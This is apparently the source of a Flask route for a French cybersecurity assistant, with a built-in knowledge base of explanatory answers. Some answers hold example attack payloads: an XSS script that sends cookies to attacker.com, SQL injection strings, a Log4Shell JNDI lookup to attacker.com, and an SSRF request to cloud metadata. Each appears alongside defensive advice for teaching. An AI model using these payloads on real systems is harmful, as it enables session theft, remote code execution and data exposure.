"""
PySecOps — Assistant Cybersécurité IA
Branché sur Claude si clé disponible, sinon base locale.
"""
from flask import Blueprint, render_template, request, jsonify, Response, stream_with_context
from app.utils.db_utils import enregistrer
import os
import json
import re

assistant_bp = Blueprint('assistant', __name__)

SYSTEM_PROMPT = """Tu es un expert en cybersécurité offensive et défensive.
Tu travailles pour PySecOps, une plateforme professionnelle de sécurité.
Tu réponds en français, de manière précise, technique et concise.
Tu couvres : pentest, OSINT, forensique, cryptographie, CVE, OWASP,
malware, réseau, cloud security, DevSecOps.
Pour chaque réponse tu donnes : explication claire, exemples concrets,
commandes/outils si pertinent, et recommandations de sécurité."""

# ── Base de connaissances locale (fallback sans clé API)
CONNAISSANCES = {
    r"xss|cross.site.script": {
        "titre": "XSS — Cross-Site Scripting",
        "reponse": "Le XSS injecte du JavaScript malveillant dans une page web.\n\n**Types :**\n- Réfléchi : payload dans l'URL\n- Stocké : payload sauvegardé en base\n- DOM : manipulation du DOM côté client\n\n**Exemple de payload :**\n```\n<script>document.location='http://attacker.com/steal?c='+document.cookie</script>\n```\n\n**Protection :** échapper les entrées, CSP stricte, httpOnly sur les cookies.",
        "categorie": "Attaque Web",
    },
    r"sql.inject|sqli": {
        "titre": "Injection SQL",
        "reponse": "Insertion de code SQL dans les entrées pour manipuler la base de données.\n\n**Exemple :**\n```\n' OR 1=1 --\n' UNION SELECT username,password FROM users --\n```\n\n**Outils :** sqlmap, manual testing\n\n**Protection :** requêtes préparées (PDO, paramètres), ORM, validation des entrées.",
        "categorie": "Attaque Web",
    },
    r"log4shell|log4j|cve-2021-44228": {
        "titre": "Log4Shell — CVE-2021-44228",
        "reponse": "Vulnérabilité critique dans Log4j2 (CVSS 10.0) permettant une RCE via JNDI lookup.\n\n**Payload :**\n```\n${jndi:ldap://attacker.com/exploit}\n```\n\n**Impact :** exécution de code à distance sans authentification\n\n**Correction :** mettre à jour Log4j2 vers 2.17.1+, désactiver les lookups JNDI.",
        "categorie": "CVE Critique",
    },
    r"ransomware|rançon": {
        "titre": "Ransomware",
        "reponse": "Malware qui chiffre vos fichiers et réclame une rançon.\n\n**Vecteurs courants :**\n- Phishing (pièces jointes malveillantes)\n- RDP exposé avec mot de passe faible\n- Vulnérabilités non patchées (EternalBlue/SMB)\n\n**Protection :**\n- Règle 3-2-1 pour les sauvegardes\n- EDR sur tous les postes\n- Patch management régulier\n- Segmentation réseau",
        "categorie": "Malware",
    },
    r"pentest|test.*intrusion|méthodologie": {
        "titre": "Méthodologie de Pentest",
        "reponse": "**Phases PTES :**\n\n1. **Reconnaissance** — OSINT passif (WHOIS, DNS, emails, subdomains)\n2. **Scanning** — ports, services, versions, OS fingerprinting\n3. **Analyse** — CVE lookup, test manuel des vulnérabilités\n4. **Exploitation** — PoC contrôlé, élévation de privilèges\n5. **Post-exploitation** — mouvement latéral, persistence\n6. **Rapport** — findings, CVSS, remédiation\n\n**Outils :** Nmap, Burp Suite, Metasploit, sqlmap, Gobuster",
        "categorie": "Méthodologie",
    },
    r"osint|reconnaissance passive": {
        "titre": "OSINT — Open Source Intelligence",
        "reponse": "Collecte d'informations depuis des sources publiques sans toucher la cible.\n\n**Sources :**\n- `crt.sh` — sous-domaines via certificats SSL\n- `Shodan` — services exposés sur internet\n- `Hunter.io` — emails professionnels\n- `theHarvester` — emails, sous-domaines\n- `Google Dorks` — fichiers sensibles indexés\n- `LinkedIn` — employés et technologies\n\n**Règle d'or :** ne jamais envoyer de requêtes directes à la cible en phase passive.",
        "categorie": "Reconnaissance",
    },
    r"owasp|top 10": {
        "titre": "OWASP Top 10 (2021)",
        "reponse": "Les 10 risques les plus critiques des applications web :\n\n1. **A01** Broken Access Control\n2. **A02** Cryptographic Failures\n3. **A03** Injection (SQL, XSS, SSTI...)\n4. **A04** Insecure Design\n5. **A05** Security Misconfiguration\n6. **A06** Vulnerable Components\n7. **A07** Auth & Session Failures\n8. **A08** Integrity Failures\n9. **A09** Logging & Monitoring Failures\n10. **A10** SSRF\n\nSource : owasp.org/Top10",
        "categorie": "Standards",
    },
    r"sha256|sha-256|hachage|hash": {
        "titre": "SHA-256 et fonctions de hachage",
        "reponse": "Fonction mathématique irréversible produisant une empreinte de taille fixe.\n\n**Algorithmes par usage :**\n```\nMD5 (32 hex)    → intégrité basique SEULEMENT (cassé)\nSHA1 (40 hex)   → obsolète, vulnérable aux collisions\nSHA256 (64 hex) → standard actuel ✅\nSHA512 (128 hex)→ haute sécurité ✅\nbcrypt          → mots de passe ✅\nArgon2          → mots de passe (recommandé 2024) ✅\n```\n\n**Règle :** Ne JAMAIS utiliser MD5/SHA1 pour les mots de passe.",
        "categorie": "Cryptographie",
    },
    r"aes|chiffrement symétrique": {
        "titre": "AES — Chiffrement symétrique",
        "reponse": "Standard de chiffrement le plus utilisé au monde.\n\n**Modes recommandés :**\n```\nAES-128-GCM  → usage courant ✅\nAES-256-GCM  → haute sécurité, gouvernemental ✅\nAES-CBC      → acceptable mais préférer GCM\nAES-ECB      → JAMAIS (patterns visibles) ❌\n```\n\n**En Python :**\n```python\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nkey = AESGCM.generate_key(bit_length=256)\naesgcm = AESGCM(key)\n```",
        "categorie": "Cryptographie",
    },
    r"ssrf|server.side.request": {
        "titre": "SSRF — Server-Side Request Forgery",
        "reponse": "Force le serveur à effectuer des requêtes vers des ressources internes.\n\n**Exemple :**\n```\nhttps://target.com/fetch?url=http://169.254.169.254/latest/meta-data/\n```\n\n**Impact :** accès aux métadonnées cloud (AWS/GCP/Azure), services internes, SSRF → RCE\n\n**Protection :** whitelist des URLs, bloquer les IPs privées, désactiver les redirections",
        "categorie": "Attaque Web",
    },
    r"mfa|2fa|double authentification": {
        "titre": "MFA — Authentification Multi-Facteurs",
        "reponse": "Ajoute une couche de sécurité après le mot de passe.\n\n**Facteurs :**\n- Ce que vous savez : mot de passe\n- Ce que vous avez : TOTP (Google Auth, Authy), clé FIDO2/WebAuthn\n- Ce que vous êtes : biométrie\n\n**Recommandation 2024 :** FIDO2/WebAuthn > TOTP > SMS (SMS = vulnérable au SIM swapping)\n\n**Activez le MFA sur :** email, GitHub, cloud, banque, VPN.",
        "categorie": "Authentification",
    },
    r"burp|burp suite": {
        "titre": "Burp Suite — Proxy HTTP",
        "reponse": "Outil incontournable du pentester web.\n\n**Modules clés :**\n- **Proxy** — intercepte et modifie les requêtes HTTP\n- **Repeater** — rejoue et modifie les requêtes\n- **Intruder** — attaques automatisées (brute-force, fuzzing)\n- **Scanner** — détection automatique de vulnérabilités (Pro)\n- **Decoder** — encode/décode Base64, URL, HTML...\n\n**Workflow :** Proxy → Intercept → Send to Repeater → Tester",
        "categorie": "Outils",
    },
    r"nmap": {
        "titre": "Nmap — Network Scanner",
        "reponse": "Scanner réseau de référence.\n\n**Commandes essentielles :**\n```bash\nnmap -sV -sC target.com          # scan services + scripts\nnmap -p- --min-rate 5000 target  # scan tous les ports\nnmap -sU -top-ports 100 target   # scan UDP\nnmap -O target.com               # détection OS\nnmap --script vuln target        # scripts de vulnérabilités\n```\n\n**Formats de sortie :**\n```bash\nnmap -oN output.txt target  # texte\nnmap -oX output.xml target  # XML\n```",
        "categorie": "Outils",
    },
}

REPONSE_DEFAUT = {
    "titre":    "Question reçue",
    "reponse":  "Je suis votre assistant cybersécurité. Je peux vous aider sur :\n\n**Attaques web :** XSS, SQLi, SSRF, CSRF, LFI/RFI\n**Malware :** Ransomware, phishing, APT\n**Cryptographie :** AES, SHA256, bcrypt, hachage\n**Outils :** Nmap, Burp Suite, sqlmap, Metasploit\n**Standards :** OWASP Top 10, PTES, CVE/CVSS\n**Authentification :** MFA, JWT, sessions\n\nPosez une question précise pour une réponse technique détaillée.",
    "categorie": "Aide",
}


def repondre_local(question: str) -> dict:
    q = question.lower().strip()
    for pattern, reponse in CONNAISSANCES.items():
        if re.search(pattern, q, re.IGNORECASE):
            return reponse
    return REPONSE_DEFAUT


@assistant_bp.route('/assistant')
def assistant():
    api_key = os.environ.get("ANTHROPIC_API_KEY", "")
    mode = "claude" if api_key else "local"
    return render_template('assistant.html', active='assistant', mode=mode)


@assistant_bp.route('/api/assistant', methods=['POST'])
def api_assistant():
    question = request.json.get('question', '').strip()
    if not question:
        return jsonify({"erreur": "Question vide."})

    enregistrer("assistant", question[:50])
    api_key = os.environ.get("ANTHROPIC_API_KEY", "")

    # ── Mode Claude API (streaming)
    if api_key:
        try:
            import anthropic

            def generer_claude():
                client = anthropic.Anthropic(api_key=api_key)
                with client.messages.stream(
                    model="claude-opus-4-5",
                    max_tokens=1024,
                    system=SYSTEM_PROMPT,
                    messages=[{"role": "user", "content": question}]
                ) as stream:
                    for text in stream.text_stream:
                        yield f"data: {json.dumps({'text': text})}\n\n"
                yield "data: [DONE]\n\n"

            return Response(
                stream_with_context(generer_claude()),
                mimetype='text/event-stream',
                headers={'Cache-Control': 'no-cache', 'X-Accel-Buffering': 'no'}
            )
        except Exception as e:
            pass

    # ── Mode local (fallback)
    reponse = repondre_local(question)
    return jsonify({
        "titre":    reponse["titre"],
        "reponse":  reponse["reponse"],
        "categorie":reponse.get("categorie", ""),
        "mode":     "local",
    })
